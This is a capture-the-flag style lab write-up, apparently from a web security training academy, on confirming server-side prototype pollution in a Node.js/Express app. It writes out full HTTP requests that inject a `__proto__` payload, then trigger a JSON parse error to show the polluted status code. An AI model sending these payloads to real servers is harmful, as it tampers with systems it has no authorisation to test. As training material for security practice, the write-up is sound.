## Detecting server-side prototype pollution without polluted property reflection

This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object.

To solve the lab, confirm the vulnerability by polluting Object.prototype in a way that triggers a noticeable but non-destructive change in the server's behavior. As this lab is designed to help you practice non-destructive detection techniques, you don't need to progress to exploitation.

You can log in to your own account with the following credentials: wiener:peter

Note :

When testing for server-side prototype pollution, it's possible to break application functionality or even bring down the server completely. If this happens to your lab, you can manually restart the server using the button provided in the lab banner. Remember that you're unlikely to have this option when testing real websites, so you should always use caution.

## Notes

- /login
- Billing and Delivery form

## Resume

1. Submit the address form and capture `POST /my-account/change-address`.
2. Test a harmless `__proto__` payload.
3. Trigger a JSON parse error and observe the default `statusCode: 400`.
4. Pollute `Object.prototype.status` with a value between `400` and `599`.
5. Trigger the same parse error again and confirm that the status changes.
6. Use that behavior as proof of prototype pollution.

## Solve

First, log in and submit the billing and delivery address form. The request is sent as JSON, which shows that the backend is accepting user input and merging it into a server-side object. That makes this endpoint a good place to test for prototype pollution.

A harmless first probe is:

```http
POST /my-account/change-address HTTP/2
Host: 0aaf009f0377204081dd363d00e200df.web-security-academy.net
Cookie: session=lbGeqO6RMlJjPSs6qQeX6aLlfpUuHJ68
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK",
  "sessionId":"lbGeqO6RMlJjPSs6qQeX6aLlfpUuHJ68",
  "__proto__": {
    "foo":"bar"
  }
}
```

If nothing obvious appears in the normal response, that is fine. In this lab, the real clue comes from the error path, not the success path.

Next, the JSON syntax is broken on purpose by removing a comma before `sessionId`. That forces the server to return a parse error:

```http
POST /my-account/change-address HTTP/2
Host: 0aaf009f0377204081dd363d00e200df.web-security-academy.net
Cookie: session=lbGeqO6RMlJjPSs6qQeX6aLlfpUuHJ68
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK"
  "sessionId":"lbGeqO6RMlJjPSs6qQeX6aLlfpUuHJ68"
}
```

The response shows a 500 error, but the JSON body still contains:

```json
"statusCode":400
```

That tells us the error object is built in a way that can be influenced by inherited properties.

Now the JSON syntax is fixed again, and the harmless property is replaced with a `status` value that sits in the valid HTTP error range:

```http
POST /my-account/change-address HTTP/2
Host: 0aaf009f0377204081dd363d00e200df.web-security-academy.net
Cookie: session=lbGeqO6RMlJjPSs6qQeX6aLlfpUuHJ68
Content-Type: application/json;charset=UTF-8

{
  "address_line_1":"Wiener HQ",
  "address_line_2":"One Wiener Way",
  "city":"Wienerville",
  "postcode":"BU1 1RP",
  "country":"UK",
  "sessionId":"lbGeqO6RMlJjPSs6qQeX6aLlfpUuHJ68",
  "__proto__": {
    "status": 599
  }
}
```

This value is important because the status code must remain between 400 and 599.

The same JSON syntax error is triggered again. This time, the response shows:

```json
"statusCode":599
"status":599
```

That proves the error object is inheriting `status` from `Object.prototype`. In other words, the application is vulnerable, and the prototype pollution has been confirmed.

The server does not need to reflect the polluted property in the normal response. Instead, the shared error object used for JSON parse failures inherits `status` from the prototype chain. Once that value is changed, the error handler uses it as the HTTP status code.